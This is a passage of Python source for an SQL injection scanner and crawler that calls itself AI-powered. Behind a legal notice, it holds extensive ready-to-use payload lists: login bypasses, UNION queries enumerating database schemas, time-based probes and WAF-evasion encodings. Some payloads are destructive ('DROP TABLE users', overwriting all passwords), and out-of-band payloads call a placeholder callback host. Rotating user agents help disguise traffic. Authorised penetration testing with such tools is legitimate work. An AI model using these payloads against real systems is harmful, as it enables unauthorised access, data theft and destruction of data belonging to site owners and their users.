#!/usr/bin/env python3
"""
SQLi Benchmark Scanner + Full Web Crawler  ·  v7.2  (Per-Endpoint Logs + Timestamps + Final Summary)
======================================================================================================
AI-powered SQL Injection detection tool — v7.1 base + v7.2 upgrade.

NEW IN v7.2
──────────────────────────────────────────────────────────────────────────────
  1. SEPARATE TERMINAL SCAN OUTPUT FILES (per endpoint)
     - Each endpoint gets its own <hostname>_endpoint_<hash>_scan.log file
     - Logs are written in real-time during scanning
     - EndpointLogger class handles creation / writing / closing
     - _test_job writes to both global printer and the per-endpoint log

  2. TIMESTAMP ON EVERY FINDING
     - Every result dict now carries a "timestamp" ISO-8601 field
     - Timestamp printed inline in _print_result (after confidence)
     - Timestamp included in every report finding block

  3. FINAL SUMMARY at END OF REPORT
     - save_report() appends a dedicated FINAL SUMMARY section after
       the Analysis Summary block
     - Lists every finding (confirmed then possible) in compact tabular
       format: #  Verdict  Method  Vector  URL  Payload  Confidence  Time
     - Severity badge repeated at the very end for quick triage

All v7.1 features retained (classified output, duplicate reduction,
structured JSON export, CVSS severity, curl PoC, etc.).

LEGAL NOTICE
────────────
Only use on systems you own or have explicit written permission to test.
"""

import argparse
import copy
import csv
import difflib
import hashlib
import json
import math
import os
import queue
import re
import ssl
import sys
import time
import threading
import urllib.parse
import urllib.request
import urllib.error
import urllib.robotparser
import random
import xml.etree.ElementTree as ET
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional, List, Dict, Tuple, Any

# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────────────────────────────────────
ANTHROPIC_API_KEY = os.environ.get("ANTHROPIC_API_KEY", "enter your key")
ANTHROPIC_API_URL = "https://api.anthropic.com/v1/messages"
CLAUDE_MODEL      = "claude-sonnet-4-20250514"

REQUEST_TIMEOUT   = 20
CRAWL_THREADS     = 10
SCAN_THREADS      = 15
CRAWL_MAX_PAGES   = 300
CRAWL_MAX_DEPTH   = 6
RATE_LIMIT_DELAY  = 0.15
MAX_RETRIES       = 3
RETRY_BACKOFF     = 1.5

DATASET_MAX_PAYLOADS = 300

# ── Scan profiles ─────────────────────────────────────────────────────────────
PROFILES = {
    "quick":    {"payloads": 8,   "scan_threads": 10, "crawl_threads": 6,  "max_depth": 2},
    "standard": {"payloads": 20,  "scan_threads": 15, "crawl_threads": 10, "max_depth": 4},
    "deep":     {"payloads": 50,  "scan_threads": 20, "crawl_threads": 12, "max_depth": 6},
    "paranoid": {"payloads": 999, "scan_threads": 8,  "crawl_threads": 8,  "max_depth": 8},
}

# ──────────────────────────────────────────────────────────────────────────────
# ROTATING USER-AGENTS
# ──────────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Edg/124.0.0.0",
]

# ──────────────────────────────────────────────────────────────────────────────
# TECHNIQUE TAGS
# ──────────────────────────────────────────────────────────────────────────────
TECH_E = "E"; TECH_B = "B"; TECH_T = "T"; TECH_U = "U"
TECH_Q = "Q"; TECH_S = "S"; TECH_W = "W"; TECH_D = "D"; TECH_N = "N"
TECH_L = "L"  # Login-specific

def _tag_technique(payload: str, tag_hint: str = "") -> str:
    pl = payload.lower()
    if tag_hint.startswith("login_"):  return TECH_L
    if tag_hint.startswith("time_"):   return TECH_T
    if tag_hint.startswith("union_"):  return TECH_U
    if tag_hint.startswith("blind_"):  return TECH_B
    if tag_hint.startswith("stacked"): return TECH_S
    if "sleep(" in pl or "waitfor" in pl or "pg_sleep" in pl: return TECH_T
    if " union " in pl:   return TECH_U
    if " and 1=1" in pl or " and 1=2" in pl or " or 1=1" in pl: return TECH_B
    if "select " in pl and "(" in pl: return TECH_Q
    if ";" in pl:         return TECH_S
    if "'" in pl or "\"" in pl: return TECH_E
    return TECH_E

# ──────────────────────────────────────────────────────────────────────────────
# COLOURS
# ──────────────────────────────────────────────────────────────────────────────
RED     = "\033[91m"; GREEN   = "\033[92m"; YELLOW  = "\033[93m"
CYAN    = "\033[96m"; MAGENTA = "\033[95m"; BLUE    = "\033[94m"
BOLD    = "\033[1m";  DIM     = "\033[2m";  RESET   = "\033[0m"

def c(text, colour): return f"{colour}{text}{RESET}"

METHOD_COLORS = {
    "GET": BLUE, "POST": GREEN, "PUT": YELLOW,
    "PATCH": MAGENTA, "DELETE": RED,
}

BANNER = f"""
{BOLD}{RED}
 ███████╗ ██████╗ ██╗     ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██╔════╝██╔═══██╗██║     ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║
 ███████╗██║   ██║██║     ███████╗███████╗██║     ███████║██╔██╗ ██║
 ╚════██║██║▄▄ ██║██║     ██║    ╚════██║██║     ██╔══██║██║╚██╗██║
 ███████║╚██████╔╝███████╗██║    ███████║╚██████╗██║  ██║██║ ╚████║
 ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{RESET}{YELLOW}  AI-Powered SQLi Scanner v7.2  ⚡  Per-Endpoint Logs + Timestamps + Final Summary{RESET}
{DIM}  POST+JSON · Context-Aware · Multi-Signal Detection · Baseline Diff · Login-Specific{RESET}
{DIM}  Dataset · Express Routes · Boolean-Blind · Time-Dual-Probe · WAF-Bypass · GraphQL{RESET}
"""

# ──────────────────────────────────────────────────────────────────────────────
# GLOBAL REQUEST OPTIONS
# ──────────────────────────────────────────────────────────────────────────────
class RequestOptions:
    verify_ssl    : bool  = True
    extra_headers : dict  = {}
    rate_delay    : float = RATE_LIMIT_DELAY
    allowed_scope : list  = []
    oob_host      : str   = "YOUR_CALLBACK_HOST.burpcollaborator.net"

_req_opts = RequestOptions()

def _ssl_context() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    if not _req_opts.verify_ssl:
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
    return ctx

# ──────────────────────────────────────────────────────────────────────────────
# THREAD-SAFE PRINTER
# ──────────────────────────────────────────────────────────────────────────────
class SafePrinter:
    _STOP = object()
    def __init__(self):
        self._q      = queue.Queue()
        self._lines  = []
        self._lock   = threading.Lock()
        self._thread = threading.Thread(target=self._drain, daemon=True)
        self._thread.start()

    def _drain(self):
        while True:
            msg = self._q.get()
            if msg is self._STOP:
                break
            print(msg)
            clean = re.sub(r'\033\[[0-9;]*m', '', msg)
            with self._lock:
                self._lines.append(clean)

    def log(self, msg: str): self._q.put(msg)
    def stop(self):
        self._q.put(self._STOP)
        self._thread.join()

    @property
    def lines(self) -> list:
        with self._lock:
            return list(self._lines)

# ──────────────────────────────────────────────────────────────────────────────
# PROGRESS BAR
# ──────────────────────────────────────────────────────────────────────────────
class ProgressBar:
    def __init__(self, total: int, label: str = "", width: int = 40):
        self.total  = total
        self.label  = label
        self.width  = width
        self._done  = 0
        self._lock  = threading.Lock()
        self._start = time.time()

    def inc(self):
        with self._lock:
            self._done += 1
            self._render()

    def _render(self):
        pct     = self._done / max(self.total, 1)
        filled  = int(self.width * pct)
        bar     = "█" * filled + "░" * (self.width - filled)
        elapsed = time.time() - self._start
        eta     = ""
        if self._done > 0:
            remaining = (elapsed / self._done) * (self.total - self._done)
            eta = f"  ETA {remaining:.0f}s"
        line = (f"\r  {c(self.label, CYAN)}  [{c(bar, BLUE)}]  "
                f"{c(f'{self._done}/{self.total}', BOLD)}  "
                f"{c(f'{pct:.0%}', YELLOW)}{c(eta, DIM)}   ")
        sys.stdout.write(line)
        sys.stdout.flush()
        if self._done >= self.total:
            sys.stdout.write("\n")
            sys.stdout.flush()

# ──────────────────────────────────────────────────────────────────────────────
# NEW v7.2 FEATURE 1 — PER-ENDPOINT LOG FILES
# ──────────────────────────────────────────────────────────────────────────────

class EndpointLogger:
    """
    Creates and manages one log file per endpoint.

    File naming:
        <base_dir>/<hostname>_endpoint_<8-char-hash>_scan.log

    The hash is derived from (method, url, vector_type) so that the same
    endpoint always maps to the same log file within a scan session.

    Usage:
        logger = EndpointLogger(ep, base_dir="scan_logs", hostname="example.com")
        logger.write("some line")
        logger.close()

    Calling close() is idempotent.
    """

    _STRIP_ANSI = re.compile(r'\033\[[0-9;]*m')

    def __init__(self, ep: "Endpoint", base_dir: str, hostname: str):
        os.makedirs(base_dir, exist_ok=True)
        key_str  = f"{ep.method}:{ep.url}:{ep.vector_type}"
        ep_hash  = hashlib.md5(key_str.encode()).hexdigest()[:8]
        safe_host = re.sub(r'[^\w.\-]', '_', hostname)
        filename  = f"{safe_host}_endpoint_{ep_hash}_scan.log"
        self.path = os.path.join(base_dir, filename)
        self._lock = threading.Lock()
        with open(self.path, "a", encoding="utf-8") as f:
            f.write(f"{'='*70}\n")
            f.write(f"Endpoint  : [{ep.method}] {ep.url}\n")
            f.write(f"Vector    : {ep.vector_type}\n")
            f.write(f"Params    : {ep.params}\n")
            f.write(f"Source    : {ep.source}\n")
            f.write(f"Scan start: {datetime.now().isoformat()}\n")
            f.write(f"{'='*70}\n\n")

    def write(self, line: str):
        """Append a plain-text line (ANSI codes are stripped automatically)."""
        clean = self._STRIP_ANSI.sub('', line)
        with self._lock:
            try:
                with open(self.path, "a", encoding="utf-8") as f:
                    f.write(clean + "\n")
            except OSError:
                pass  # Never crash the scan because of log I/O

    def close(self):
        """Write a closing footer to the log."""
        self.write(f"\n{'='*70}")
        self.write(f"Scan end  : {datetime.now().isoformat()}")
        self.write(f"{'='*70}\n")


class EndpointLoggerRegistry:
    """
    Thread-safe registry that hands out (and reuses) EndpointLogger instances
    keyed by ep.key.  One logger per unique endpoint across all threads.
    """

    def __init__(self, base_dir: str, hostname: str):
        self._base_dir  = base_dir
        self._hostname  = hostname
        self._loggers:  Dict[str, EndpointLogger] = {}
        self._lock      = threading.Lock()

    def get(self, ep: "Endpoint") -> EndpointLogger:
        with self._lock:
            if ep.key not in self._loggers:
                self._loggers[ep.key] = EndpointLogger(
                    ep, self._base_dir, self._hostname)
            return self._loggers[ep.key]

    def close_all(self):
        with self._lock:
            for logger in self._loggers.values():
                logger.close()
            self._loggers.clear()

# ──────────────────────────────────────────────────────────────────────────────
# v7.0 FEATURE 5 — LOGIN-SPECIFIC PAYLOAD SET
# ──────────────────────────────────────────────────────────────────────────────

AUTH_URL_KEYWORDS   = ["login", "signin", "sign-in", "auth", "authenticate",
                       "session", "token", "jwt", "oauth", "account", "user"]
AUTH_PARAM_KEYWORDS = ["username", "user", "email", "login", "password",
                       "passwd", "pass", "credential", "auth"]

def _is_login_endpoint(ep) -> bool:
    url_lower = ep.url.lower()
    if any(kw in url_lower for kw in AUTH_URL_KEYWORDS):
        return True
    param_str = " ".join(str(p).lower() for p in (ep.params or []))
    if any(kw in param_str for kw in AUTH_PARAM_KEYWORDS):
        return True
    return False

LOGIN_USERNAME_PAYLOADS = [
    ("admin'--",                                    "login_user_admin_comment"),
    ("admin'#",                                     "login_user_admin_hash"),
    ("' OR '1'='1",                                 "login_user_or_taut"),
    ("' OR '1'='1'--",                              "login_user_or_taut_comment"),
    ("' OR '1'='1'#",                               "login_user_or_taut_hash"),
    ("' OR 1=1--",                                  "login_user_or_1eq1"),
    ("' OR 1=1#",                                   "login_user_or_1eq1_hash"),
    ("admin' OR '1'='1'--",                         "login_user_admin_or"),
    ("admin' OR '1'='1'#",                          "login_user_admin_or_hash"),
    ("' OR ''='",                                   "login_user_empty_string"),
    ("anything' OR 'x'='x",                         "login_user_x_eq_x"),
    ("' OR 2>1--",                                  "login_user_comparison"),
    ("\"admin\"--",                                  "login_user_dquote"),
    ("admin\"--",                                   "login_user_admin_dquote"),
    ("') OR ('1'='1",                               "login_user_paren"),
    ("') OR ('1'='1'--",                            "login_user_paren_comment"),
    ("1' AND 1=(SELECT 1)--",                       "login_user_subquery"),
    ("admin'/*",                                    "login_user_block_comment"),
    ("' OR 1=1 LIMIT 1--",                          "login_user_limit"),
    ("' UNION SELECT 1,'admin','admin'--",          "login_user_union"),
]

LOGIN_PASSWORD_PAYLOADS = [
    ("' OR '1'='1",                                 "login_pass_or_taut"),
    ("' OR 1=1--",                                  "login_pass_or_1eq1"),
    ("password' OR '1'='1",                         "login_pass_suffix"),
    ("' OR ''='",                                   "login_pass_empty"),
    ("anything",                                    "login_pass_bypass_any"),
    ("' AND SLEEP(5)--",                            "login_pass_time"),
    ("' AND 1=(SELECT 1 FROM users LIMIT 1)--",     "login_pass_subquery"),
    ("' OR (SELECT COUNT(*) FROM users)>0--",       "login_pass_count"),
]

LOGIN_JSON_PAYLOADS = [
    ("' OR '1'='1",                                 "login_json_user_or"),
    ("admin'--",                                    "login_json_user_admin"),
    ("admin' OR '1'='1'--",                         "login_json_user_admin_or"),
    ("\" OR \"1\"=\"1",                             "login_json_user_dquote"),
    ("[$gt]",                                       "login_json_nosql_gt"),
    ("' AND SLEEP(5)--",                            "login_json_user_time"),
]

ALL_LOGIN_PAYLOADS = (
    LOGIN_USERNAME_PAYLOADS
    + LOGIN_PASSWORD_PAYLOADS
    + LOGIN_JSON_PAYLOADS
)

# ──────────────────────────────────────────────────────────────────────────────
# v7.0 FEATURE 2 — CONTEXT-AWARE PAYLOAD SELECTION
# ──────────────────────────────────────────────────────────────────────────────

_PARAM_CONTEXT = {
    "numeric":  ["id", "page", "limit", "offset", "count", "num",
                 "size", "row", "pid", "uid", "gid", "fid", "cid",
                 "order_id", "product_id", "user_id", "item_id"],
    "auth":     ["username", "user", "email", "login", "password",
                 "passwd", "pass", "credential", "auth", "token",
                 "apikey", "api_key", "secret"],
    "search":   ["q", "s", "query", "search", "keyword", "term",
                 "find", "filter", "text", "content", "title",
                 "name", "description", "tag", "category"],
    "date":     ["date", "from", "to", "start", "end", "time",
                 "created", "updated", "since", "until", "year",
                 "month", "day", "timestamp"],
    "file":     ["file", "path", "dir", "include", "page",
                 "template", "view", "lang", "locale"],
}

NUMERIC_PAYLOADS = [
    ("1 OR 1=1",                                   "ctx_num_or"),
    ("1 AND 1=1",                                  "ctx_num_and_true"),
    ("1 AND 1=2",                                  "ctx_num_and_false"),
    ("1 UNION SELECT NULL--",                      "ctx_num_union"),
    ("1; SELECT 1--",                              "ctx_num_stacked"),
    ("-1 UNION SELECT 1,2,3--",                    "ctx_num_union_neg"),
    ("0 OR 1=1",                                   "ctx_num_zero_or"),
    ("1' AND SLEEP(5)--",                          "ctx_num_time"),
    ("1 AND SLEEP(5)",                             "ctx_num_sleep"),
    ("2-1",                                        "ctx_num_arithmetic"),
    ("1/**/AND/**/1=1",                            "ctx_num_comment_bypass"),
]

SEARCH_PAYLOADS = [
    ("test' UNION SELECT NULL--",                  "ctx_srch_union"),
    ("test' AND '1'='1",                           "ctx_srch_and_true"),
    ("test' OR '1'='1",                            "ctx_srch_or"),
    ("'",                                          "ctx_srch_bare_quote"),
    ("%' UNION SELECT NULL--",                     "ctx_srch_pct_union"),
    ("test%",                                      "ctx_srch_wildcard"),
    ("' AND SLEEP(5)--",                           "ctx_srch_time"),
    ("test' ORDER BY 1--",                         "ctx_srch_order"),
    ("test' AND 1=CAST(1 AS INT)--",               "ctx_srch_cast"),
]

DATE_PAYLOADS = [
    ("2024-01-01' OR '1'='1",                      "ctx_date_or"),
    ("2024-01-01'--",                              "ctx_date_comment"),
    ("' OR '1'='1",                               "ctx_date_bare_or"),
    ("2024-01-01' AND SLEEP(5)--",                 "ctx_date_time"),
    ("2024-01-01' UNION SELECT NULL--",            "ctx_date_union"),
    ("0000-00-00",                                 "ctx_date_zero"),
    ("9999-99-99",                                 "ctx_date_overflow"),
]

def get_param_context(param_name: str) -> str:
    pn = str(param_name).lower().strip()
    for bucket, names in _PARAM_CONTEXT.items():
        if pn in names or any(kw in pn for kw in names):
            return bucket
    return "generic"

def context_payloads_for_param(param_name: str,
                               generic_payloads: List[Tuple[str,str]]) -> List[Tuple[str,str]]:
    ctx = get_param_context(param_name)
    if ctx == "numeric":
        return NUMERIC_PAYLOADS + generic_payloads
    if ctx == "search":
        return SEARCH_PAYLOADS + generic_payloads
    if ctx == "date":
        return DATE_PAYLOADS + generic_payloads
    if ctx == "auth":
        return ALL_LOGIN_PAYLOADS + generic_payloads
    return generic_payloads

# ──────────────────────────────────────────────────────────────────────────────
# BUILT-IN PAYLOADS
# ──────────────────────────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    ("' UNION SELECT sqlite_version()--",           "sqlite_version"),
    ("' AND randomblob(500000000)--",               "sqlite_time"),
    ("' AND 1=CAST(sqlite_version() AS INTEGER)--", "sqlite_cast"),
    ("'",                                           "bare_quote"),
    ("''",                                          "double_quote"),
    ("\\",                                          "backslash"),
    ("1'",                                          "int_quote"),
    ("\"",                                          "double_dquote"),
    ("1\"",                                         "int_dquote"),
    ("'/**/OR/**/1=1--",                            "error_comment"),
    ("' OR 1=1--",                                  "classic_or_comment"),
    ("' OR '1'='1",                                 "tautology"),
    ("admin'--",                                    "auth_bypass"),
    ("' OR ''='",                                   "empty_string"),
    ("1 OR 1=1",                                    "numeric_or"),
    ("' OR 2>1--",                                  "comparison"),
    ("'||'1'='1",                                   "concat_or"),
    ("'; SELECT 1--",                               "stacked"),
    ("1; DROP TABLE users--",                       "stacked_drop"),
]

UNION_PAYLOADS = [
    ("' UNION SELECT NULL--",                       "union_1col"),
    ("' UNION SELECT NULL,NULL--",                  "union_2col"),
    ("' UNION SELECT NULL,NULL,NULL--",             "union_3col"),
    ("' UNION SELECT 1,2,3--",                      "union_nums"),
    ("' UNION SELECT table_name,2 FROM information_schema.tables--", "union_tables"),
    ("' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--", "union_cols"),
    ("' UNION SELECT user(),2--",                   "union_user"),
    ("' UNION SELECT version(),2--",                "union_version"),
    ("' UNION SELECT @@datadir,2--",                "union_datadir"),
]

BLIND_TRUE_PAYLOADS = [
    ("' AND 1=1--",      "blind_true_1"),
    ("' AND 'a'='a'--",  "blind_true_2"),
    ("1 AND 1=1",        "blind_true_int"),
    ("' AND 2>1--",      "blind_true_cmp"),
]
BLIND_FALSE_PAYLOADS = [
    ("' AND 1=2--",      "blind_false_1"),
    ("' AND 'a'='b'--",  "blind_false_2"),
    ("1 AND 1=2",        "blind_false_int"),
    ("' AND 2<1--",      "blind_false_cmp"),
]

TIME_PAYLOADS = [
    ("' AND SLEEP(5)--",                    "time_mysql"),
    ("'; WAITFOR DELAY '0:0:5'--",          "time_mssql"),
    ("'; SELECT pg_sleep(5)--",             "time_pgsql"),
    ("' AND 1=1 AND SLEEP(5)--",            "time_mysql_blind"),
    ("' OR SLEEP(5)--",                     "time_or_mysql"),
    ("'; BEGIN DBMS_LOCK.SLEEP(5); END;--", "time_oracle"),
]
TIME_BASELINE_PAYLOADS = [
    ("' AND SLEEP(0)--",            "time_mysql_baseline"),
    ("'; WAITFOR DELAY '0:0:0'--",  "time_mssql_baseline"),
    ("'; SELECT pg_sleep(0)--",     "time_pgsql_baseline"),
]

WAF_BYPASS_PAYLOADS = [
    ("%27 OR %271%27=%271",                 "url_encoded"),
    ("' /*!OR*/ '1'='1",                   "mysql_inline_comment"),
    ("'/**/OR/**/1=1--",                   "comment_bypass"),
    ("' OR/**/1=1--",                      "comment_bypass2"),
    ("' OORR '1'='1",                      "doubled_keyword"),
    ("'%20OR%20'1'='1",                    "space_encoded"),
    ("'\tor\t'1'='1",                      "tab_separator"),
    ("'\nor\n'1'='1",                      "newline_separator"),
    ("' OR 0x31=0x31--",                   "hex_comparison"),
    ("' OR ASCII(1)=49--",                 "ascii_comparison"),
    ("' OR CHAR(49)='1'--",               "char_comparison"),
    ("'+'",                                "string_concat"),
    ("' OR (SELECT 1)=1--",               "subquery"),
    ("';%00--",                            "null_byte"),
]

SECOND_ORDER_PAYLOADS = [
    ("admin'--",                                         "second_order_admin"),
    ("test' OR '1'='1",                                  "second_order_or"),
    ("'; UPDATE users SET password='hacked' WHERE '1'='1", "second_order_update"),
]

OOB_CALLBACK = "YOUR_CALLBACK_HOST.burpcollaborator.net"
OOB_PAYLOADS = [
    (f"' AND LOAD_FILE(CONCAT('\\\\\\\\',({OOB_CALLBACK}),'.oob.txt'))--", "oob_mysql_load"),
    (f"'; EXEC xp_dirtree '\\\\{OOB_CALLBACK}\\share'--",                  "oob_mssql_dirtree"),
    (f"' UNION SELECT UTL_HTTP.REQUEST('http://{OOB_CALLBACK}/')--",       "oob_oracle_http"),
]

DEFAULT_BENIGN_INPUTS = [
    ("hello",            "plain_word"),
    ("john@example.com", "email"),
    ("12345",            "integer"),
    ("test product",     "search_term"),
    ("2024-01-01",       "date"),
    ("O'Brien",          "name_apostrophe"),
]

INJECTABLE_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Custom-IP-Authorization",
    "Referer", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "True-Client-IP", "Client-IP",
]

COMMON_PARAMS = [
    "id", "q", "search", "query", "s", "username", "email",
    "name", "page", "cat", "item", "product", "user", "key",
    "keyword", "term", "filter", "type", "ref", "code",
    "sort", "order", "limit", "offset", "from", "to",
    "start", "end", "date", "time", "token", "hash", "action",
    "view", "file", "path", "dir", "include", "lang", "locale",
    "title", "author", "price", "category", "isbn", "rating",
]

AUTH_PATHS = [
    ("/login",           "POST"),
    ("/signin",          "POST"),
    ("/user/login",      "POST"),
    ("/account/login",   "POST"),
    ("/auth/login",      "POST"),
    ("/api/login",       "POST"),
    ("/api/auth",        "POST"),
    ("/api/v1/login",    "POST"),
    ("/api/users/login", "POST"),
    ("/api/auth/login",  "POST"),
]

# ──────────────────────────────────────────────────────────────────────────────
# DATASET LOADER
# ──────────────────────────────────────────────────────────────────────────────
def _normalise_payload(pl: str) -> str:
    pl = re.sub(r"'[^']*'",   "'?'", pl)
    pl = re.sub(r'"[^"]*"',   '"?"', pl)
    pl = re.sub(r'\b\d+\b',   'N',   pl)
    pl = re.sub(r'\s+',       ' ',   pl)
    return pl.strip().lower()

def _infer_technique_from_dataset_payload(pl: str) -> str:
    pl_l = pl.lower()
    if "sleep(" in pl_l or "waitfor" in pl_l or "pg_sleep" in pl_l: return TECH_T
    if " union " in pl_l:   return TECH_U
    if re.search(r'\band\b.*=.*\band\b|or\s+\d+=\d+', pl_l):         return TECH_B
    if "select" in pl_l and "(" in pl_l: return TECH_Q
    if ";" in pl:            return TECH_S
    return TECH_E

class DatasetLoader:
    PAYLOAD_COLS = ["query","payload","sample","input","request","sqli","text"]
    LABEL_COLS   = ["label","class","is_attack","attack","malicious","type"]

    def __init__(self, csv_path: str, max_payloads: int = DATASET_MAX_PAYLOADS,
                 printer=None):
        self.csv_path         = csv_path
        self.max_payloads     = max_payloads
        self.printer          = printer
        self.attack_payloads: List[Tuple[str,str]] = []
        self.benign_inputs:   List[Tuple[str,str]] = []
        self._load()

    def _log(self, msg):
        (self.printer.log(msg) if self.printer else print(msg))

    def _extract_injected_value(self, raw: str) -> str:
        raw = raw.strip()
        if not re.match(r'^\s*(SELECT|INSERT|UPDATE|DELETE|WITH)\b', raw, re.IGNORECASE):
            return raw
        m = re.search(r"WHERE\s+\w+\s*=\s*'([^']*(?:''[^']*)*)'(.*)", raw, re.IGNORECASE)
        if m:
            return "'" + m.group(1) + "'" + (m.group(2) or "")
        m2 = re.search(r"WHERE\s+\w+\s*=\s*(\S+)(.*)", raw, re.IGNORECASE)
        if m2:
            return m2.group(1) + (m2.group(2) or "")
        return raw

    def _load(self):
        if not os.path.isfile(self.csv_path):
            self._log(c(f"  [Dataset] File not found: {self.csv_path}", YELLOW))
            return
        attacks_raw, benign_raw = [], []
        try:
            with open(self.csv_path, newline="", encoding="utf-8", errors="replace") as f:
                sample  = f.read(4096); f.seek(0)
                dialect = csv.Sniffer().sniff(sample, delimiters=",;\t|")
                reader  = csv.DictReader(f, dialect=dialect)
                headers = [h.lower().strip() for h in (reader.fieldnames or [])]
                payload_col = next((h for h in headers if h in self.PAYLOAD_COLS), None)
                label_col   = next((h for h in headers if h in self.LABEL_COLS), None)
                if payload_col is None:
                    self._log(c(f"  [Dataset] No recognised payload column. Found: {headers}", YELLOW))
                    return
                for row in reader:
                    row     = {k.lower().strip(): v for k, v in row.items()}
                    raw     = row.get(payload_col, "").strip()
                    if not raw: continue
                    payload = self._extract_injected_value(raw)
                    if label_col:
                        lbl = row.get(label_col, "").strip()
                        is_attack = lbl in ("1","true","attack","malicious","sqli","1.0")
                    else:
                        is_attack = bool(re.search(r"['\";]|--|\bOR\b|\bAND\b|\bUNION\b",
                                                   payload, re.IGNORECASE))
                    (attacks_raw if is_attack else benign_raw).append(payload)
        except Exception as e:
            self._log(c(f"  [Dataset] Failed to load: {e}", YELLOW)); return

        seen_norms, deduped = set(), []
        for pl in attacks_raw:
            h = hashlib.md5(_normalise_payload(pl).encode()).hexdigest()
            if h not in seen_norms:
                seen_norms.add(h); deduped.append(pl)
        deduped.sort(key=len)
        random.shuffle(deduped[:min(len(deduped), self.max_payloads * 2)])
        deduped = deduped[:self.max_payloads]
        for i, pl in enumerate(deduped):
            tech = _infer_technique_from_dataset_payload(pl)
            self.attack_payloads.append((pl, f"dataset_{tech}_{i:04d}"))
        for i, pl in enumerate(benign_raw[:50]):
            self.benign_inputs.append((pl, f"benign_dataset_{i:03d}"))
        self._log(c(f"  [Dataset] Loaded {len(self.attack_payloads)} attack + "
                    f"{len(self.benign_inputs)} benign baseline samples", CYAN))

# ──────────────────────────────────────────────────────────────────────────────
# EXPRESS ROUTE PARSER
# ──────────────────────────────────────────────────────────────────────────────
class ExpressRouteParser:
    ROUTE_RE = re.compile(
        r'(?:app|router|server|api)\s*\.\s*'
        r'(get|post|put|patch|delete|all)\s*\(\s*'
        r'["\`\'](\/[^"\'`\s]*)["\`\']', re.IGNORECASE)
    USE_RE = re.compile(
        r'(?:app|server)\s*\.\s*use\s*\(\s*'
        r'["\`\'](\/[^"\'`\s]*)["\`\']', re.IGNORECASE)
    ROUTE_CHAIN_RE = re.compile(
        r'\.route\s*\(\s*["\`\'](\/[^"\'`\s]*)["\`\']\s*\)'
        r'(?:\s*\.(get|post|put|patch|delete)\s*\([^)]*\))+', re.IGNORECASE)

    def __init__(self, server_file: str, base_url: str, printer=None):
        self.server_file = server_file
        self.base_url    = base_url.rstrip("/")
        self.printer     = printer
        self.routes: List[Tuple[str,str]] = []
        self._parse()

    def _log(self, msg):
        (self.printer.log(msg) if self.printer else None)

    def _parse_file(self, path: str) -> List[Tuple[str,str]]:
        found = []
        try:
            with open(path, encoding="utf-8", errors="replace") as f:
                content = f.read()
        except Exception: return found
        for m in self.ROUTE_RE.finditer(content):
            method = m.group(1).upper()
            clean  = re.sub(r':[a-zA-Z_][a-zA-Z0-9_]*', '1', m.group(2))
            found.append((self.base_url + clean, method))
        for m in self.ROUTE_CHAIN_RE.finditer(content):
            clean   = re.sub(r':[a-zA-Z_][a-zA-Z0-9_]*', '1', m.group(1))
            url     = self.base_url + clean
            methods = re.findall(r'\.(get|post|put|patch|delete)\s*\(', m.group(0), re.IGNORECASE)
            for meth in methods:
                found.append((url, meth.upper()))
        return found

    def _parse(self):
        paths_to_scan = []
        if os.path.isfile(self.server_file):
            paths_to_scan.append(self.server_file)
            server_dir = os.path.dirname(os.path.abspath(self.server_file))
            for rdir in ["routes","route","api","controllers"]:
                rd = os.path.join(server_dir, rdir)
                if os.path.isdir(rd):
                    for fn in os.listdir(rd):
                        if fn.endswith((".js",".ts")):
                            paths_to_scan.append(os.path.join(rd, fn))
        elif os.path.isdir(self.server_file):
            for root, _, files in os.walk(self.server_file):
                for fn in files:
                    if fn.endswith((".js",".ts")):
                        paths_to_scan.append(os.path.join(root, fn))
        all_routes = []
        for fp in paths_to_scan:
            found = self._parse_file(fp)
            if found: self._log(c(f"  [Routes] {fp}: {len(found)} route(s)", DIM))
            all_routes.extend(found)
        seen = set()
        for url, method in all_routes:
            key = f"{method}:{url}"
            if key not in seen:
                seen.add(key)
                self.routes.append((url, method))
        self._log(c(f"  [Routes] Parsed {len(self.routes)} unique route(s) "
                    f"from {len(paths_to_scan)} file(s)", CYAN))

    def to_endpoints(self) -> List["Endpoint"]:
        eps = []
        for url, method in self.routes:
            parsed     = urllib.parse.urlparse(url)
            qs_params  = list(urllib.parse.parse_qs(parsed.query).keys())
            path_parts = [p for p in parsed.path.split("/") if p and not p.isdigit()]
            guessed    = []
            for part in path_parts[-2:]:
                if part in ("search","find","query","lookup"):
                    guessed += ["q","query","search"]
                elif part in ("login","signin","auth","session"):
                    guessed += ["username","password","email"]
                elif part in ("users","user","account","profile"):
                    guessed += ["id","username","email"]
                elif part in ("products","books","items","orders"):
                    guessed += ["id","title","name","category"]
                else:
                    guessed += ["id","q"]
            all_params = list(dict.fromkeys(qs_params + guessed)) or ["id","q"]
            ep = Endpoint(url, method, all_params, source="route_parser",
                          vector_type="query" if method == "GET" else "form",
                          content_type="json" if method in ("POST","PUT","PATCH") else "form")
            eps.append(ep)
        return eps

# ──────────────────────────────────────────────────────────────────────────────
# HTTP HELPERS
# ──────────────────────────────────────────────────────────────────────────────
_waf_warned = threading.Event()

def _build_headers(extra: dict = None) -> dict:
    h = {
        "User-Agent":      random.choice(USER_AGENTS),
        "Accept":          "text/html,application/xhtml+xml,application/json,*/*;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection":      "keep-alive",
    }
    h.update(_req_opts.extra_headers)
